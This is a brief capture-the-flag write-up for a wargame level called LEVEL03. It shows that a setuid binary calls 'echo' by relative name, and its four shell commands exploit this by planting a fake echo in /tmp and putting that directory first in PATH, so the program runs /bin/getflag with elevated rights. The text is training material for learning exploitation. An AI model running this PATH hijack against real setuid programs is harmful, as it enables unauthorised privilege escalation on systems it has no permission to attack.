# LEVEL03

When you arrive, you can notice a file named `level03` with suid and executable permissions.
`file level03` returns a 32bit ELF executable. If you then execute it, you will get "Exploit me".
Since it is using the echo command, we can exploit it by adding another echo command in some directory, and adding the directory to the PATH variable.

```
echo "/bin/getflag" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```
